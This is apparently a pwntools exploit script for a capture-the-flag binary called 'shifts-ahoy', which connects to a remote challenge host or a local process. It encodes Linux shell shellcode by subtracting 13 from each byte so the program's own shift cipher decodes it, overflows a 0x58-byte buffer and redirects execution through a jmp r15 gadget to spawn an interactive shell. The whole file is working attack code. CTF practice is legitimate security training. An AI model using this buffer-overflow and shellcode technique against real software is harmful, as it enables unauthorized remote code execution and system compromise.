#!/usr/bin/python3

from pwn import *

encrypt_ret_addr = 0x4012e6
jmp_r15_addr = 0x00000000004011cd

context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'

elf = ELF('shifts-ahoy')

if args.REMOTE:
    p = remote('jh2i.com', 50015)
else:
    p = process(elf.path)

    if args.GDB:
        gdb.attach(p, '''
            break * 0x4012e6
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'> ', choice)

def encrypt(content):
    choose(b'1')
    p.sendlineafter(b': ', content)

def decrypt():
    choose(b'2')

shellcode = asm(shellcraft.amd64.linux.sh())
encoded = bytes([(code - 13) & 0xff for code in shellcode])
encoded_len = len(encoded)

payload = encoded + b'A' * (0x58 - len(encoded)) + p64(jmp_r15_addr)

encrypt(payload)

p.interactive()
